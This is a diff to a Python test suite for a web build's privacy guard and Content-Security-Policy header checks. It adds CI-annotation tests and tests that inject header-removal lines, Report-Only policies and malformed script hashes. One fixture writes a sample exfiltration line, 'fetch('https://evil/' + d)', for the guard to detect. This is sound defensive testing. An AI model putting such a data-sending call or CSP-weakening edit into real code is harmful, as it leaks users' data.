@@ -15,6 +15,7 @@ from __future__ import annotations
 
 import contextlib
 import io
+import os
 import sys
 import tempfile
 import unittest
@@ -135,9 +136,16 @@ class Fixture:
         with contextlib.redirect_stdout(io.StringIO()):
             assert write_headers.main(["write_headers.py", str(self.dist)]) == 0
 
-    def run(self) -> tuple[int, str]:
+    def run(self, github_actions: bool = False) -> tuple[int, str]:
+        # main() adds a `::error::` annotation per finding when GITHUB_ACTIONS
+        # is set, so the output would differ between CI and a local run. Pin
+        # the variable so every test sees the same output in both places.
         out = io.StringIO()
-        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
+        with unittest.mock.patch.dict(os.environ), \
+                contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
+            os.environ.pop("GITHUB_ACTIONS", None)
+            if github_actions:
+                os.environ["GITHUB_ACTIONS"] = "true"
             rc = privacy_check.main(["--dist", str(self.dist), "--web-crate", str(self.crate)])
         return rc, out.getvalue()
 
@@ -165,6 +173,19 @@ class GuardTest(unittest.TestCase):
 class Baseline(GuardTest):
     def test_clean_fixture_passes(self):
         self.assertPasses()
+
+    def test_github_actions_adds_one_annotation_per_finding(self):
+        # Fixture.run() clears GITHUB_ACTIONS by default; this test sets it to
+        # check the CI annotation output on its own.
+        self.fx.write("dist/snippets/dep-0123/x.js", "fetch('https://evil/' + d);\n")
+        rc, plain = self.fx.run()
+        rc_ci, ci = self.fx.run(github_actions=True)
+        self.assertEqual((rc, rc_ci), (1, 1), ci)
+        self.assertNotIn("::error::", plain)
+        findings = [line.strip() for line in plain.splitlines() if line.startswith("  ")]
+        self.assertTrue(findings, plain)
+        annotations = [line for line in ci.splitlines() if line.startswith("::error::")]
+        self.assertEqual(annotations, [f"::error::privacy_check: {f}" for f in findings])
 
     def test_permissions_policy_has_no_interest_cohort(self):
         text = (self.fx.dist / "_headers").read_text(encoding="utf-8")
@@ -550,6 +571,82 @@ class HeadersExact(GuardTest):
     def test_headers_in_subdirectory_is_unknown(self):
         self.fx.write("dist/snippets/x/_headers", "/*\n  ! Content-Security-Policy\n")
         self.assertFails("file type the privacy guard does not scan")
+
+
+class RenderedStructure(unittest.TestCase):
+    """Issue #45: the structural check also runs on the rendered file.
+
+    Each test patches write_headers.py's render path (render_headers or
+    expected_headers) to add lines outside HEADERS_TEMPLATE. The build then
+    writes those lines to dist/_headers, and the guard's expected value moves
+    with them, so the exact-match check passes. The template is untouched, so
+    template_problems passes too. Only the check on the rendered text can
+    fail the guard.
+    """
+
+    EXTRAS = {
+        "second path block": ("/index.html\n  X-Frame-Options: DENY\n",
+                              "path block '/index.html'"),
+        "removal line": ("  ! Content-Security-Policy\n",
+                         "header-removal line '! Content-Security-Policy'"),
+        "removal block": ("/index.html\n  ! Content-Security-Policy\n",
+                          "header-removal line '! Content-Security-Policy'"),
+        "report-only header": ("  Content-Security-Policy-Report-Only: default-src 'none'\n",
+                               "has a Report-Only policy"),
+    }
+
+    def run_guard(self, target: str, extra: str) -> tuple[int, str]:
+        original = getattr(write_headers, target)
+        with tempfile.TemporaryDirectory() as tmp, \
+                unittest.mock.patch.object(write_headers, target,
+                                           lambda arg: original(arg) + extra):
+            fx = Fixture(Path(tmp))
+            text = (fx.dist / "_headers").read_text(encoding="utf-8")
+            self.assertTrue(text.endswith(extra))
+            # The deployed file equals the guard's expected value, and the
+            # template still passes its own check.
+            self.assertEqual(text, write_headers.expected_headers(fx.dist))
+            self.assertEqual(privacy_check.template_problems(write_headers.HEADERS_TEMPLATE), [])
+            return fx.run()
+
+    def test_patched_render_path_fails(self):
+        for target in ("render_headers", "expected_headers"):
+            for label, (extra, needle) in self.EXTRAS.items():
+                with self.subTest(target=target, extra=label):
+                    rc, out = self.run_guard(target, extra)
+                    self.assertEqual(rc, 1, f"guard passed a patched {target}:\n{out}")
+                    self.assertNotIn("differs", out)
+                    self.assertNotIn("HEADERS_TEMPLATE:", out)
+                    # Both the render output and the deployed bytes are checked.
+                    lines = [line for line in out.splitlines() if needle in line]
+                    self.assertEqual(len(lines), 2, out)
+                    self.assertIn("write_headers.py: render_headers() output: ", lines[0])
+                    self.assertIn("/dist/_headers: ", lines[1])
+
+    def test_unpatched_render_has_no_problems(self):
+        rendered = write_headers.render_headers(["'sha256-" + "A" * 43 + "='"] * 2)
+        self.assertEqual(privacy_check.rendered_problems(rendered), [])
+
+    def test_rendered_csp_must_be_the_template_with_hashes(self):
+        good = write_headers.render_headers(["'sha256-" + "A" * 43 + "='"])
+        for label, edit in {
+            "placeholder left in": lambda t: t.replace("'sha256-" + "A" * 43 + "='",
+                                                       write_headers.SCRIPT_HASHES),
+            "no hash": lambda t: t.replace(" 'sha256-" + "A" * 43 + "='", ""),
+            "host instead of hash": lambda t: t.replace("'sha256-" + "A" * 43 + "='",
+                                                        "https://cdn.example"),
+            "directive appended": lambda t: t.replace("frame-ancestors 'none'",
+                                                      "frame-ancestors 'none'; img-src *"),
+            "short hash": lambda t: t.replace("'sha256-" + "A" * 43 + "='", "'sha256-AAAA'"),
+            "long hash": lambda t: t.replace("'sha256-" + "A" * 43 + "='",
+                                             "'sha256-" + "A" * 44 + "='"),
+            "43 chars, no padding": lambda t: t.replace("'sha256-" + "A" * 43 + "='",
+                                                        "'sha256-" + "A" * 43 + "'"),
+        }.items():
+            with self.subTest(edit=label):
+                problems = privacy_check.rendered_problems(edit(good))
+                self.assertTrue(any("Content-Security-Policy line is not" in p
+                                    or "placeholder" in p for p in problems), problems)
 
 
 class FileTypesAnyCase(GuardTest):
